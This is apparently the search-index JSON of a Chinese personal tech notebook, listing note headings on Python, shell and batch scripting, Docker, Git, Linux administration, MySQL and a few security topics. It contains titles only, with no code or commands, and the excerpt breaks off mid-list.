{"config":{"lang":["en"],"separator":"[\\s\\-]+","pipeline":["stopWordFilter"]},"docs":[{"location":"","title":"zjuchenyuan\u2019s Notebook","text":"<p>My notebook about technology, for lookup and share</p> <p>\u67e5\u770b\u5185\u5bb9 \u8bf7\u70b9\u51fbTopic\u6807\u9898\uff08\u5982Docker\uff09\u8fdb\u5165\u9875\u9762\u540e\u4f7f\u7528\u53f3\u4fa7\u76ee\u5f55\u5b9a\u4f4d</p> <p>\u8bc4\u8bba\u8bf7\u4f7f\u7528: Github Issue</p> <p>\u67e5\u770b\u6700\u8fd1\u7684\u66f4\u65b0</p>"},{"location":"#python","title":"Python","text":"<ul> <li>\u8bed\u8a00\u52fe\u52d2QuickStart</li> <li>\u5b89\u88c5pip</li> <li>\u8bbe\u7f6epip\u6e90</li> <li>requests\u4f7f\u7528\u591aIP\u8bf7\u6c42</li> <li>Python\u591a\u7ebf\u7a0b\u6a21\u677f</li> <li>http.server\uff08BaseHTTPServer\uff09\u5e76\u53d1\u6027\u6539\u5584 \u4e0d\u5fc5\u4fee\u6539\u5e93\u6587\u4ef6</li> <li>\u4e2d\u6587\u8f93\u51fa\u4e71\u7801\u95ee\u9898\u89e3\u51b3</li> <li>pycodestyle\u68c0\u67e5\u4ee3\u7801\u98ce\u683c</li> <li>\u751f\u6210\u968f\u673a\u5b57\u7b26\u4e32</li> <li>\u522b\u5bf9\u5927\u7684list\u5faa\u73af\u4f7f\u7528in\uff0c\u5e94\u8be5\u6539\u7528set</li> <li>\u89e3\u51b3Python.h: No such file or directory</li> <li>\u4e8c\u8fdb\u5236\u5b57\u7b26\u4e32\u8f6c\u666e\u901a\u5b57\u7b26\u4e32</li> <li>\u5341\u516d\u8fdb\u5236\u5b57\u7b26\u4e32\u8f6cbytes\u5b57\u7b26\u4e32</li> <li>\u7528requests\u8fdb\u884cpost</li> <li>\u7b26\u53f7\u6570\u4e0e\u65e0\u7b26\u53f7\u6570\u8f6c\u6362</li> <li>\u4f7f\u7528signal.SIGALRM\u5728\u9650\u5b9a\u65f6\u95f4\u540e\u9000\u51fa\u8fdb\u7a0b</li> <li>\u6355\u6349\u7528\u6237\u7684Ctrl+C</li> <li>\u4f7f\u7528signal.SIGALRM\u5b9e\u73b0\u5b9a\u65f6\u5668</li> <li>\u4f7f\u7528pdb\u8fdb\u884c\u8c03\u8bd5</li> <li>\u4f7f\u7528Python\u5f00\u53d1\u963f\u91cc\u4e91\u51fd\u6570\u8ba1\u7b97\u540e\u7aef\u670d\u52a1</li> <li>\u4fee\u590dgbk\u7f16\u7801\u7684\u6587\u4ef6\u540d</li> <li>Crack RSA! \u7834\u89e3\u77ed\u957f\u5ea6\u5bc6\u94a5\u7684RSA\u52a0\u5bc6</li> <li>\u65f6\u95f4\u6233\u4e0e\u5b57\u7b26\u4e32\u76f8\u4e92\u8f6c\u6362</li> <li>\u7528redis\u5b58\u50a8\u5b57\u5178</li> <li>python selenium+Docker chrome headless\u722c\u590d\u6742\u7f51\u9875</li> <li>python transmissionrpc \u4e0a\u4f20\u79cd\u5b50 \u83b7\u53d6\u72b6\u6001 \u589e\u52a0tracker \u4fee\u6539torrent\u6587\u4ef6\u4e2d\u7684tracker</li> <li>uwsgi\u4f18\u96c5\u91cd\u542f</li> <li>Python3.5 open\u6253\u5f00\u6587\u4ef6\u9ed8\u8ba4\u4f7f\u7528utf-8</li> <li>\u4f7f\u7528sentry</li> <li>\u89e3\u51b3\u547d\u4ee4\u884c\u6267\u884cpy\u6587\u4ef6\u6ca1\u6709sys.argv\u7684\u95ee\u9898</li> <li>Python\u83b7\u53d6Windows Chrome\u7684Cookie</li> <li>Win\u5f00\u53d1\u6446\u8131\u6bcf\u6b21\u90fd\u8981\u5199\u7684encoding=utf-8</li> <li>Ubuntu16.04\u5b89\u88c5Python3.7</li> <li>Python\u4f7f\u7528MongoDB \u589e\u5220\u67e5\u6539 \u6279\u91cf\u8986\u76d6\u63d2\u5165 \u591a\u8868join \u968f\u673a\u91c7\u6837</li> </ul>"},{"location":"#python_1","title":"Python\u7a0b\u5e8f\u8bbe\u8ba1\u8bfe\u7a0b","text":"<p>\u4f5c\u4e1a\u7684\u5e38\u89c1\u9519\u8bef\uff0c\u671f\u672b\u590d\u4e60</p>"},{"location":"#gist-python","title":"gist Python\u4e00\u4e9b\u5e38\u7528\u7684\u4ee3\u7801\u7247\u6bb5","text":"<ul> <li>\u8fde\u63a5mysql\u63d2\u5165\u3001\u67e5\u8be2</li> <li>\u5927\u5c0f\u5199\u4e0d\u654f\u611f\u5b57\u5178</li> <li>print\u7684\u65f6\u5019\u987a\u5e26\u5e26\u4e0a\u65f6\u95f4</li> <li>mpms\u591a\u7ebf\u7a0b\u4e0b\u6bcf\u4e2a\u7ebf\u7a0b\u5355\u72ec\u53d8\u91cf</li> <li>\u4f7f\u7528AES\u52a0\u5bc6\u5b57\u7b26\u4e32 pyaes\u5e93</li> </ul>"},{"location":"#bash","title":"BASH","text":"<ul> <li>\u5728bash\u811a\u672c\u4e2d\u4f7f\u7528alias</li> <li>\u5224\u65ad\u547d\u4ee4\u884c\u53c2\u6570\u662f\u5426\u4e3a\u7a7a</li> <li>for\u5faa\u73af</li> <li>\u5224\u65ad\u547d\u4ee4\u3001\u6587\u4ef6\u662f\u5426\u5b58\u5728</li> <li>rsync\u79fb\u52a8\u8fdc\u7a0b\u76ee\u5f55\u7279\u5b9a\u6587\u4ef6\u81f3\u672c\u673a\u540e\u5faa\u73af\u64cd\u4f5c</li> </ul>"},{"location":"#bat","title":"BAT \u6279\u5904\u7406","text":"<ul> <li>\u5feb\u901f\u6253\u5f00cmd</li> <li>\u5e76\u5217\u8bed\u53e5\u8bed\u6cd5</li> <li>\u5faa\u73affor</li> <li>\u7ed3\u675f\u8fdb\u7a0btaskkill</li> <li>\u5185\u5b58\u6574\u7406free</li> <li>\u7761\u4e00\u4f1aSleepX</li> <li>\u5224\u65ad\u6587\u4ef6\u5939\u5b58\u5728</li> <li>\u521b\u5efa\u786c\u94fe\u63a5mklink\u6216\u8005fsutil hardlink create</li> <li>\u7aef\u53e3\u8f6c\u53d1</li> <li>\u4fdd\u6301RVPN\u4e0d\u65ad\u5f00</li> <li>vpn\u9759\u6001\u8def\u7531\u914d\u7f6e</li> <li>\u8fdb\u5165\u4f11\u7720</li> <li>\u5feb\u901f\u8fdb\u5165\u7cfb\u7edf\u4ee3\u7406\u8bbe\u7f6e\uff0c\u4e0d\u7528\u6253\u5f00IE</li> <li>\u5728\u666e\u901a\u6743\u9650cmd\u4e2d\u83b7\u5f97\u66f4\u9ad8\u6743\u9650</li> <li>\u547d\u4ee4\u884c\u914d\u7f6eIP</li> <li>\u547d\u4ee4\u884c\u4f7f\u7528VeraCrypt</li> <li>\u547d\u4ee4\u884c\u4e34\u65f6\u5173\u95edWindows Defender</li> <li>\u547d\u4ee4\u884c\u589e\u52a0Windows\u9632\u706b\u5899\u89c4\u5219\u963b\u65adIP</li> </ul>"},{"location":"#bitcoin","title":"Bitcoin","text":"<ul> <li>\u671f\u8d27\u6c38\u7eed\u5408\u7ea6\u4ecb\u7ecd</li> <li>\u6c38\u7eed\u5408\u7ea6\u8d44\u91d1\u8d39\u7387\u5957\u5229 \u5b9e\u65f6\u6536\u76ca\u7387</li> </ul>"},{"location":"#c","title":"C \u8bed\u8a00","text":"<ul> <li>\u5173\u4e8eDev C++</li> <li>\u8f93\u5165\u7684\u95ee\u9898\uff0c\u5efa\u8bae\u7528gets\u548csscanf</li> <li>C++\u7528sstream\u4ee3\u66ffsprintf</li> <li>g++\u7701\u7565\u62f7\u8d1d\u6784\u9020\u51fd\u6570\u7684\u95ee\u9898</li> <li>[\u6570\u636e\u7ed3\u6784]\u6811\u7684\u904d\u5386</li> <li>\u5bf9\u4e00\u4e2aconst\u7684vector\u4f7f\u7528\u8fed\u4ee3\u5668\u8981\u7528const_iterator</li> <li>\u5c0f\u5fc3\u672a\u521d\u59cb\u5316\u7684\u53d8\u91cf</li> <li>\u83b7\u53d6\u6587\u4ef6\u5927\u5c0f</li> <li>\u9898\u76ee\u89e3\u6790 (\u7ed3\u6784\u6307\u9488\u3001\u7ed3\u6784\u6570\u7ec4\u2026)</li> </ul>"},{"location":"#cdn","title":"CDN","text":"<ul> <li>\u00b7UPYUN \u53c8\u62cd\u4e91</li> <li>\u7ba1\u7406\u6587\u4ef6\u53ef\u4ee5\u7528FTP\uff0cUpyunManager\uff0cUpx</li> <li>python\u89c4\u5219\u5237\u65b0\uff0cpython\u8c03\u7528\u5b98\u65b9API\u8fdb\u884cURL\u5237\u65b0</li> <li>\u4f7f\u7528upyun\u63d0\u4f9b\u7684webp\u529f\u80fd\u8282\u7701\u6d41\u91cf</li> <li>\u4f7f\u7528\u8fb9\u7f18\u89c4\u5219\u4fee\u590d\u6539\u7248\u5bfc\u81f4\u7684404\u95ee\u9898</li> <li>\u4f7f\u7528\u8fb9\u7f18\u89c4\u5219\u5b9e\u73b0upyun TOKEN\u53cd\u76d7\u94fe\u529f\u80fd</li> <li>https\u8bc1\u4e66\u66f4\u65b0\u7684\u81ea\u52a8\u5316\u811a\u672c</li> <li>\u8868\u5355\u4e0a\u4f20bash\u5feb\u901f\u8c03\u7528</li> <li>\u00b7Qiniu \u4e03\u725b</li> <li>\u4f7f\u7528qshell\u4e0a\u4f20\u6587\u4ef6\u5939</li> <li>\u672c\u5730DNS\u4e0d\u9760\u8c31\uff1f\u7528HTTP DNS\u8bbf\u95ee\u6b63\u786e\u7684CDN\u8282\u70b9</li> <li>UPYUN\u7701\u94b1\u65b9\u6848\uff1a\u7f13\u5b5861\u79d2 \u53d8\u4e3a\u9759\u6001\u8bf7\u6c42 </li> </ul>"},{"location":"#curl","title":"cURL","text":"<ul> <li>\u6a21\u62df\u6d4f\u89c8\u5668\u8bf7\u6c42</li> <li>\u57fa\u672c\u6559\u7a0b</li> <li>\u8fd8\u53ef\u4ee5\u5faa\u73af\u54df</li> <li>wget\u57280b/s\u65f6\u81ea\u52a8\u91cd\u8fde</li> </ul>"},{"location":"#developer","title":"Developer","text":"<ul> <li>\u4fdd\u6301\u6280\u672f\u7cbe\u8fdb</li> <li>\u5982\u4f55\u660e\u667a\u5730\u5411\u7a0b\u5e8f\u5458\u63d0\u95ee</li> <li>\u4f7f\u7528chrome\u7f13\u5b58\u627e\u5230\u88ab\u5220\u7684qq\u7a7a\u95f4\u7684\u56fe\u7247</li> <li>\u4e3a\u4ec0\u4e48\u6211\u559c\u6b22\u5199\u535a\u5ba2\uff1f</li> <li>\u652f\u6301\u88abat\u7684(outgoing)\u9489\u9489\u673a\u5668\u4eba</li> <li>Go\u8bed\u8a00-\u5b89\u88c5 \u5b89\u88c5\u7f3a\u5931\u5e93</li> </ul>"},{"location":"#docker","title":"Docker","text":"<ul> <li>myubuntu \u57fa\u7840\u955c\u50cf</li> <li>\u5b89\u88c5</li> <li>\u52a0\u901f\u955c\u50cf\u4e0b\u8f7d</li> <li>\u65e7\u7248\u672c\u5378\u8f7d</li> <li>\u83b7\u5f97\u5bb9\u5668\u7684ip</li> <li>\u5bfc\u5165\u5bfc\u51fa\u5bb9\u5668</li> <li>\u89e3\u51b3iptables failed\u95ee\u9898</li> <li>\u8fc1\u79fbDocker\u6587\u4ef6\u5939\u5230\u5176\u4ed6\u786c\u76d8</li> <li>\u89e3\u51b3debian\u7b49\u5bb9\u5668\u6ca1\u6709ifconfig\u7684\u95ee\u9898</li> <li>\u8bbe\u7f6e\u5bb9\u5668\u4f4e\u6743\u9650\u7528\u6237\u8fd0\u884c</li> <li>\u8bbe\u7f6e\u5bb9\u5668/etc/resolv.conf\u548c/etc/hosts</li> <li>\u5bb9\u5668\u9650\u5236\u53c2\u6570\u8bbe\u7f6e</li> <li>\u5feb\u901f\u90e8\u7f72ftp</li> <li>\u5feb\u901f\u90e8\u7f72wordpress</li> <li>Dockerfile \u4e2d\u7684 apt-get \u9759\u9ed8\u6267\u884c</li> <li>\u8ba9Docker\u5bb9\u5668\u5f97\u5230\u5185\u7f51IP</li> <li>\u4f7f\u7528iptables\u7aef\u53e3\u8f6c\u53d1\u8ba9Docker\u5bb9\u5668\u5f97\u5230\u5185\u7f51IP</li> <li>\u5feb\u901f\u90e8\u7f72samba</li> <li>[CTF]\u6309\u9700\u5206\u914d\u5bb9\u5668 \u8fc7\u671f\u81ea\u52a8\u9500\u6bc1</li> <li>\u5728\u5bb9\u5668A\u4e2d\u4f7f\u7528\u522b\u540d\u8bbf\u95ee\u5bb9\u5668B</li> <li>\u4fee\u590dDocker\u66f4\u65b0\u523018.02\u540e\u90e8\u5206\u5bb9\u5668\u65e0\u6cd5start\u7684\u95ee\u9898</li> <li>\u89e3\u51b3docker exec -it\u8fdb\u5165\u5bb9\u5668\u5c4f\u5e55\u5927\u5c0f\u4e0d\u5bf9\u7684\u95ee\u9898</li> <li>\u542f\u52a8\u53e6\u4e00\u4e2aDocker Daemon\u8fdb\u7a0b</li> <li>\u914d\u7f6e\u4f7f\u7528Docker\u7248\u672c\u7684Gitlab CI</li> <li>\u4e3a\u5df2\u7ecf\u5b58\u5728\u7684\u5bb9\u5668\u521b\u5efa\u4e34\u65f6\u7aef\u53e3\u6620\u5c04 socat</li> <li>\u8fd0\u884c\u4e2d\u7684\u5bb9\u5668\u6dfb\u52a0\u76ee\u5f55\u6302\u8f7d</li> <li>Docker\u4f7f\u752832\u4f4d\u955c\u50cf</li> <li>\u4fee\u6539Docker\u5e95\u5c42\u6587\u4ef6\u4fee\u6539macvlan\u53d8\u66f4\u7f51\u6bb5</li> <li>\u83b7\u53d62\u4e2a\u6708\u524d\u9000\u51fa\u7684\u5bb9\u5668\u5217\u8868\uff0c\u4ee5\u7a7a\u683c\u5206\u9694</li> <li>nsenter\u8fdb\u5165\u5bb9\u5668\u68c0\u67e5\u7f51\u7edc</li> <li>\u4ece/var/lib/docker\u63d0\u53d6\u5bb9\u5668\u5f00\u59cb\u65f6\u95f4</li> <li>\u56fa\u5b9a\u5bb9\u5668\u7684IP</li> <li>Docker\u5bb9\u5668\u7981\u6b62\u4e3b\u52a8\u8054\u7f51 \u4f46\u5bf9\u5916\u63d0\u4f9bweb\u670d\u52a1</li> <li>\u79c1\u6709registry\u7684api</li> </ul>"},{"location":"#eth","title":"ETH","text":"<ul> <li>\u83b7\u53d6\u6d4b\u8bd5\u7f51\u7edcropsten\u7684ETH</li> <li>\u751f\u6210\u4e00\u5806\u4e0eMetaMask\u517c\u5bb9\u7684\u5730\u5740</li> <li>Python\u53d1\u8d77\u4ea4\u6613(Web3.py)</li> <li>\u5730\u5740\u4ea4\u6613\u67e5\u8be2API</li> </ul>"},{"location":"#favorites","title":"Favorites","text":"<ul> <li>Intel i386 \u624b\u518c \u53ca \u52d8\u8bef</li> <li>ASCII\u5b57\u7b26\u56fe\u6848\u751f\u6210</li> <li>\u89e3\u91caShell\u547d\u4ee4\u6bcf\u4e2a\u53c2\u6570</li> <li>\u5b89\u5168\u4f1a\u8bae\u7684\u6392\u540d \u5efa\u8bae\u8bfb\u7684\u8bba\u6587</li> <li>More Links</li> <li>Git Emoji</li> </ul>"},{"location":"#flask","title":"Flask","text":"<ul> <li>\u5e94\u7528\u6839\u76ee\u5f55APP_ROOT</li> <li>render_template\u5f15\u5165\u6240\u6709\u5168\u5c40\u53d8\u91cf+\u5c40\u90e8\u53d8\u91cf</li> <li>\u6dfb\u52a0\u591a\u4e2a\u9759\u6001\u76ee\u5f55</li> <li>\u5224\u65ad\u662f\u5426\u624b\u673a\u8bbf\u95ee g.isphone</li> <li>request\u600e\u4e48\u62ff\u5230url\u7684\u5404\u4e2a\u90e8\u5206</li> <li>\u9047\u5230\u6027\u80fd\u74f6\u9888\u505aprofiling\u770b\u51fd\u6570\u8017\u65f6</li> <li>lazyload \u5ef6\u8fdf\u52a0\u8f7d\u8017\u65f6\u7684\u521d\u59cb\u5316\u64cd\u4f5c</li> <li>\u8ba9app.run\u542f\u52a8\u7684\u670d\u52a1\u5668\u4f7f\u7528HTTP/1.1</li> <li>\u8ba9render_template\u76f4\u63a5\u80fd\u4f7f\u7528\u5f53\u524d\u6240\u6709\u53d8\u91cf</li> </ul>"},{"location":"#fuzzing","title":"Fuzzing","text":""},{"location":"#dataflow-sanitizer","title":"DataFlow Sanitizer","text":"<ul> <li>Compiling Exiv2 with DFSan (including compile libcxx)</li> </ul>"},{"location":"#git","title":"Git","text":"<ul> <li>\u7acb\u5373\u4f7f\u7528</li> <li>git clone\u52a0\u901f \u2013depth 1</li> <li>git push\u52a0\u901f</li> <li>git push\u514d\u5bc6\u7801</li> <li>bash\u5de5\u4f5c\u73af\u5883(\u522b\u540d,\u81ea\u52a8\u5b8c\u6210,dirty\u63d0\u793a)\u8bbe\u7f6e</li> <li>\u597d\u73a9\u7684\u547d\u4ee4\u4eec</li> <li>gitignore\u8d1f\u5411\u9009\u62e9</li> <li>\u8865\u4e0acommit\u6f0f\u6389\u7684\u6587\u4ef6 \u2013amend</li> <li>\u5bc6\u7801\u6cc4\u9732\u67e5\u4f5c\u8005 blame</li> <li>\u6587\u4ef6\u4e00\u6b21\u6027\u6539\u592a\u591a\u4e86\uff0c\u62c6\u6210\u591a\u6b21\u63d0\u4ea4 add -p</li> <li>\u672c\u5730\u5ffd\u7565\u4e00\u4e9b\u4e2a\u4eba\u7684\u4fee\u6539</li> <li>\u672c\u5730\u521b\u5efabranch\u540epush\u64cd\u4f5cgit push -u</li> <li>\u7528gpg\u7ed9git\u63d0\u4ea4\u7b7e\u540d</li> <li>\u4f7f\u7528GitLab API\u5b58\u50a8\u6570\u636e\u5907\u4efd\u6587\u4ef6 \u4e0d\u5360\u7528\u672c\u5730\u7a7a\u95f4</li> <li>GitHub\u4e0d\u540c\u4ed3\u5e93\u4f7f\u7528\u4e0d\u540cssh key</li> <li>\u5907\u4efdGitHub\u4e0a\u81ea\u5df1star\u8fc7\u7684\u4ed3\u5e93</li> </ul>"},{"location":"#github-project-recommendation","title":"Github Project Recommendation","text":"<ul> <li>\u89c6\u9891\u4e0b\u8f7dyou-get</li> <li>\u8bb0\u5fc6\u624b\u6bb5Anki</li> <li>\u5728\u7ebf\u8bc4\u6d4bOnlineJudge</li> <li>Python\u4e5f\u80fd\u7528\u6765\u89e3\u65b9\u7a0bsympy</li> <li>\u8ba9\u7f51\u7ad9\u94fe\u63a5\u79d2\u5f00InstantClick</li> </ul>"},{"location":"#java","title":"Java","text":"<ul> <li>\u4e00\u4e9bJava\u4e0eC++\u7684\u4e0d\u540c\u4e4b\u5904</li> <li>\u5f02\u5e38\u5904\u7406\u4e2d\u7684\u8d44\u6e90\u91ca\u653e\u95ee\u9898</li> <li>JVM\u542f\u52a8\u65f6\u7684\u5185\u5b58\u53c2\u6570</li> <li>\u4fee\u590dStruts2\u7684S2-045\u6f0f\u6d1e</li> </ul>"},{"location":"#javascript","title":"JavaScript","text":"<ul> <li>\u4f7f\u7528\u672c\u5730\u5b58\u50a8localStorage</li> <li>\u968f\u673a\u5b57\u7b26\u4e32\u751f\u6210</li> <li>\u5f02\u5e38</li> <li>\u4f7f\u7528phantomjs\u722c\u53d6\u7f51\u9875</li> <li>jQuery\u7ed1\u5b9a\u201d\u53d8\u4e3a\u53ef\u89c1\u201d\u4e8b\u4ef6</li> <li>\u8bfb\u53d6GET\u53c2\u6570</li> <li>\u4f7f\u7528 Github Issue \u4f5c\u4e3a\u535a\u5ba2\u8bc4\u8bba\u533a</li> <li>history.replaceState\u4fee\u6539\u5386\u53f2\u8bb0\u5f55</li> <li>\u8bb0\u4f4f\u4e00\u4e2acheckbox\u7684\u72b6\u6001</li> <li>\u4f7f\u7528InstantClick\u8e29\u5751</li> <li>\u7528\u539f\u751fJavascript\u64cd\u4f5cDOM\u8282\u70b9</li> <li>\u52ab\u6301\u52a8\u6001\u56fe\u7247\u52a0\u8f7d \u4fee\u6539src\u5c5e\u6027</li> <li>\u4fdd\u6301\u7279\u5b9a\u5143\u7d20\u76f8\u5bf9\u4e8e\u7a97\u53e3\u7684\u4f4d\u7f6e\u4e0d\u53d8</li> <li>Tampermonkey\u81ea\u52a8\u586b\u5145\u7528\u6237\u540d\u5bc6\u7801\u8868\u5355\uff0c\u5e76\u901a\u8fc7\u524d\u7aef\u7684\u8868\u5355\u68c0\u67e5</li> <li>\u4f7f\u7528browserify\u5c06npm\u5305\u6253\u5305\u6210\u6d4f\u89c8\u5668\u80fd\u7528\u7684js\u6587\u4ef6</li> </ul>"},{"location":"#jekyll","title":"Jekyll","text":"<ul> <li>\u78b0\u5230\u8fc7\u7684\u5751</li> <li>\u914d\u7f6e\u4ee3\u7801\u9ad8\u4eae\u5e76\u663e\u793a\u884c\u53f7</li> <li>\u89e3\u51b3Github Metadata Warning</li> <li>\u5b89\u88c5Jekyll</li> </ul>"},{"location":"#linux-setup","title":"Linux-setup","text":"<ul> <li>\u7f51\u7edc\u52a0\u901fprivoxy</li> <li>\u914d\u7f6e\u6709\u7ebf\u9759\u6001IP</li> <li>\u4f7f\u7528ifconfig\u4fee\u6539ip\u540e\u8bb0\u5f97\u8981\u91cd\u65b0\u914droute</li> <li>\u914d\u7f6eapt\u6e90\u4ee5\u52a0\u901f\u56fd\u5185\u73af\u5883\u4e0bapt\u901f\u5ea6</li> <li>\u5355\u7f51\u5361\u83b7\u5f97\u591a\u4e2aIP</li> <li>\u9510\u901f\u5b89\u88c5</li> <li>\u89e3\u51b3apt\u4f9d\u8d56\u95ee\u9898</li> <li>UnixBench\u6027\u80fd\u8bc4\u6d4b</li> <li>\u6e05\u9664\u5185\u5b58\u7f13\u5b58</li> <li>\u4f7f\u7528iptables\u5c01ip</li> <li>iptables\u53ea\u5141\u8bb8\u7279\u5b9aIP\u8bbf\u95ee\u67d0\u7aef\u53e3</li> <li>\u65e0root\u6743\u9650\u4f7f\u7528screen</li> <li>screen\u7684\u7528\u6cd5</li> <li>\u4e24\u6761iptables\u5b9e\u73b0\u7aef\u53e3\u8f6c\u53d1\uff0c\u66b4\u9732\u5185\u7f51\u7aef\u53e3</li> <li>\u4fdd\u62a4\u91cd\u8981\u7cfb\u7edf\u6587\u4ef6\u9632\u6b62\u88ab\u5220chattr +i</li> <li>\u65f6\u533a\u8bbe\u7f6e</li> <li>\u67e5\u770bCPU\u6838\u5fc3\u4e2a\u6570</li> <li>\u975e\u4ea4\u4e92\u5f0f\u6dfb\u52a0\u7528\u6237</li> <li>\u7b80\u5355OpenVPN\u914d\u7f6e</li> <li>\u65f6\u533a\u65f6\u95f4\u8bbe\u7f6e</li> <li>\u5feb\u901f\u5730\u683c\u5f0f\u5316\u5927\u5206\u533aext4</li> <li>\u660e\u660e\u8fd8\u6709\u5927\u91cf\u7a7a\u95f4\u5374\u8bf4\u6ca1\u6709\uff1finode\u6ee1\u4e86\uff01\u6302\u8f7d\u5355\u4e2a\u6587\u4ef6\u4e3abtrfs\u5206\u533a</li> <li>\u6269\u5bb9\u4e0a\u8ff0\u5355\u6587\u4ef6btrfs\u78c1\u76d8 /dev/loop0\u6269\u5bb9</li> <li>\u5b89\u5168\u5730\u62d4\u51fa\u79fb\u52a8\u786c\u76d8</li> <li>\u6302\u8f7d\u591a\u4e2avmdk\u4e2d\u7684LVM\u5206\u533a</li> <li>\u542f\u7528rc.local</li> </ul>"},{"location":"#linux-ssh","title":"Linux-SSH","text":"<ul> <li>\u5ba2\u6237\u7aef\u4e0d\u540c\u670d\u52a1\u5668\u4f7f\u7528\u4e0d\u540c\u7684id_rsa</li> <li>\u6362\u4e2a\u7aef\u53e3\u5f00\u542f\u4e00\u4e2a\u4e34\u65f6\u7684sshd</li> <li>ssh\u53cd\u5411\u4ee3\u7406</li> <li>\u542f\u7528SSH\u5bc6\u94a5\u767b\u5f55\u540e\u4e24\u6b65\u9a8c\u8bc1</li> <li>ssh\u767b\u5f55\u7981\u7528\u9ed8\u8ba4\u7684\u4fe1\u606f\u663e\u793a Ubuntu</li> </ul>"},{"location":"#linux-cli","title":"Linux-cli","text":"<ul> <li>\u67e5\u770b\u5185\u7f6e\u547d\u4ee4\u7684\u5e2e\u52a9</li> <li>grep\u641c\u7d22\u5e2e\u52a9\u6587\u6863</li> <li>\u5e2e\u52a9\u6587\u672c\u7684grep \u75282&gt;&amp;1</li> <li>\u5404\u79cd\u89e3\u538b\u547d\u4ee4</li> <li>\u5f53\u524d\u76ee\u5f55\u6587\u4ef6\u5168\u6587\u641c\u7d22</li> <li>\u7edf\u8ba1\u5f53\u524d\u6587\u4ef6\u5939\u4ee3\u7801\u884c\u6570</li> <li>\u67e5\u770b\u7ed9\u5b9a\u6587\u4ef6\u5217\u8868\u7684\u6587\u4ef6\u5927\u5c0f</li> <li>wget\u6162\u6162\u4e0b\u8f7d</li> <li>touch\u4fee\u6539\u65f6\u95f4\u6233</li> <li>\u53bb\u6389Ubuntu\u9ed8\u8ba4\u60c5\u51b5\u4e0bls\u7684\u989c\u8272</li> <li>\u6362\u884c\u65b9\u5f0f\u4fee\u6539</li> <li>iodine\u2013\u4f7f\u7528DNS\u4f20\u8f93\u6570\u636e</li> <li>\u8fdc\u7a0b\u63a7\u5236Windows</li> <li>\u7edf\u8ba1\u4ee5\u7279\u5b9a\u5b57\u7b26\u4e32\u5f00\u5934\u7684\u6587\u4ef6\u6570\u76ee</li> <li>hexdump\u67e5\u770b\u5b57\u7b26\u5185\u90e8\u7f16\u7801</li> <li>\u5b50\u76ee\u5f55\u5927\u5c0f\u6392\u5e8f</li> <li>\u5b89\u88c5ffmpeg</li> <li>\u4fee\u6539readonly\u7684\u53d8\u91cf</li> <li>\u6c38\u4e45\u7b49\u5f85 sleep infinity</li> <li>zmap\u626b\u63cf\u6574\u4e2a\u7f51\u6bb5\u7279\u5b9a\u5f00\u653e\u7aef\u53e3</li> <li>\u5bf9ip\u5217\u8868\u6279\u91cf\u6d4b\u8bd5redis\u672a\u6388\u6743\u6f0f\u6d1e</li> <li>\u4f7f\u7528ImageMagick\u5bf9\u56fe\u50cf\u8fdb\u884c\u88c1\u526a</li> <li>\u67e5\u627e0\u5b57\u8282\u7684\u6587\u4ef6\u5e76\u5220\u9664</li> <li>\u7528vim\u53bb\u9664\\r\u6362\u884c\u7b26 :set ff=unix</li> <li>watch\u6301\u7eed\u89c2\u5bdf\u547d\u4ee4\u8f93\u51fa</li> <li>\u6811\u8393\u6d3e2\u4e0a\u7f16\u8bd1Truecrypt 7.1a\uff0c\u4f7f\u7528make -j5 -l4\u52a0\u901f\u7f16\u8bd1</li> <li>scp\u76ee\u5f55\u65ad\u70b9\u7eed\u4f20</li> <li>\u4f7f\u7528wget\u4ee3\u66ffscp\u4f20\u8f93\u6587\u4ef6\u5939 \u907f\u514d\u65e0\u8c13\u7684\u52a0\u5bc6\u6027\u80fd\u635f\u5931\uff08\u9002\u7528\u4e8e\u6811\u8393\u6d3e\uff09</li> <li>\u6e05\u9664\u5df2\u7ecf\u65ad\u5f00\u7684sshd\u8fdb\u7a0b</li> <li>\u6279\u91cf\u66ff\u6362\u6587\u672c</li> <li>\u4ece\u4e8c\u8fdb\u5236\u6587\u4ef6\u4e2d\u63d0\u53d6\u7247\u6bb5</li> <li>redis\u5339\u914d\u524d\u7f00\u5220\u9664\u5927\u91cf\u952e\u503c</li> <li>\u6279\u91cf\u66ff\u6362\u5b50\u76ee\u5f55\u7279\u5b9a\u540e\u7f00\u540d\u6587\u4ef6\u5185\u5bb9</li> <li>coredump in fuzzing</li> <li>bash\u5bf9\u6587\u4ef6\u4e71\u5e8f\u904d\u5386</li> <li>grep\u6b63\u5219\u63d0\u53d6\u7279\u5b9a\u5185\u5bb9</li> <li>\u81ea\u52a8kill\u5927\u5185\u5b58\u7684\u8fdb\u7a0b</li> <li>screen\u81ea\u52a8\u64cd\u4f5c\u4ee5\u53ca\u83b7\u53d6\u5f53\u524d\u5c4f\u5e55\u5185\u5bb9</li> <li>gdb\u81ea\u52a8\u5316</li> <li>mktorrent\u5236\u4f5c\u79cd\u5b50torrent\u6587\u4ef6</li> </ul>"},{"location":"#linux-backup","title":"Linux-backup","text":"<ul> <li>\u4e00\u4e2a\u826f\u597d\u5b89\u5168\u7684\u5907\u4efd\u8ba1\u5212\u81f3\u5173\u91cd\u8981</li> <li>\u7528rsync\u4ee3\u66ffscp</li> <li>\u4f7f\u7528rsync\u50cftime machine\u4e00\u6837\u5168\u76d8\u5907\u4efd</li> <li>rsync\u5907\u4efd\u5b89\u5353\u624b\u673a</li> </ul>"},{"location":"#mysql","title":"MySQL","text":"<ul> <li>\u67e5\u770b\u8868\u7ed3\u6784 desc</li> <li>MERGE\u5b58\u50a8\u5f15\u64ce</li> <li>\u5220\u9664\u8868\u7684\u5197\u4f59</li> <li>\u4fee\u6539\u8868 alter table</li> <li>\u5c06\u4e2d\u6587\u8f6c\u4e3a\u62fc\u97f3\u7684\u51fd\u6570</li> <li>\u4ece\u8def\u5f84URL\u83b7\u53d6\u6587\u4ef6\u540d\u79f0</li> <li>\u67e5\u8be2\u4f18\u5316\u2013explain\u53d1\u73b0\u51fa\u73b0\u4e86using filesort\uff1b\u5185\u5b58\u8868\u7d22\u5f15\u7684\u9009\u62e9</li> <li>\u5185\u5b58\u8868The table is full\u7684\u89e3\u51b3</li> <li>replace\u51fd\u6570\u66ff\u6362\u6587\u672c</li> <li>\u7b80\u5355\u7684split\u529f\u80fd\uff0c\u6587\u672c\u8f6c\u6570\u5b57</li> <li>mysqld\u914d\u7f6e\u53c2\u6570\u8c03\u4f18</li> <li>\u652f\u6301emoji\uff0c\u4eceutf8\u5347\u7ea7\u5230utf8mb4</li> <li>\u89e3\u51b3 Too many open files \u9519\u8bef</li> <li>\u89e3\u51b3ubuntu16.04\u4e0amysql\u88abapt 